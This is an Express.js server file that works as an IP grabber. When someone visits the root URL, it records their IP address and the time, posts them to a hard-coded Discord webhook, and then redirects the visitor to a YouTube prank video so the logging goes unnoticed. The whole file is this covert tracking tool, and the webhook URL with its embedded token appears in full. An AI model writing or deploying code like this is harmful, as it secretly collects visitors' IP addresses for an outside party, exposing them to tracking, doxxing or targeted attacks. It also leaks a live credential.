import express from "express";
import dotenv from "dotenv";

dotenv.config();

const app = express();

const logger = async (ip, date) => {
    const hook = "https://discord.com/api/webhooks/1492018544374710272/cSfi9E6m6MJRk4sdF_80pVwuID9CwrDLE5OoSM9etyoKjECyNRAZfD8EmF2Ytx4xrIe-";

        console.log("Hook exists:", !!hook);

    
    const data = {
        "content": " ",
        "title": "New IP",
    }
    data.content = `**IP:** ${ip}\n**Date:** ${date}`;


    const response = await fetch(hook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    });
    
    if (response.ok) {
        console.log("Logged IP successfully");
    }
    
    return response;
}


app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const date = new Date().toISOString();

    logger(ip, date);

    res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
});


app.listen(3000, () => {
  console.log("Server is running on port 3000");
});
